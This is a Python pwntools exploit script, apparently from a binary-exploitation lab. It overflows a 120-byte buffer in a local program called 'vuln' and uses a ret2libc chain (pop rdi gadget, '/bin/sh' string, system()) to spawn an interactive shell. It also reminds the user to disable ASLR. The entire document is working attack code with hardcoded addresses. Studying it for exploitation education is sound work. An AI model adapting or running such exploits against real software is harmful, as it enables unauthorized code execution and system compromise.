#!/bin/python3

from pwn import p64, process, log, context
from sys import argv

POPRDI = 0x0401263
BINSH  = 0x7ffff7f54b62
SYSTEM = 0x7ffff7e12de0
BUFSIZ = 120

def main():

    ## default silent
    if "-v" not in argv:
        context.log_level = 21

    print("remember to turn off ASLR! (../../aslr.sh off)")

    ## create payload
    payload = p64(POPRDI)
    payload += p64(BINSH)
    payload += p64(SYSTEM)
    payload = b"\x90"*BUFSIZ + payload

    ## log
    log.info(f"POPRDI : {p64(POPRDI)}")
    log.info(f"BINSH  : {p64(BINSH)}")
    log.info(f"SYSTEM : {p64(SYSTEM)}")

    ## save for debug
    with open("pattern", "wb") as f:
        f.write(payload)

    ## start binary
    target = process("./vuln")

    ## fire
    target.send(payload)

    ## shell
    target.clean()
    target.interactive()


if __name__ == "__main__":
    main()

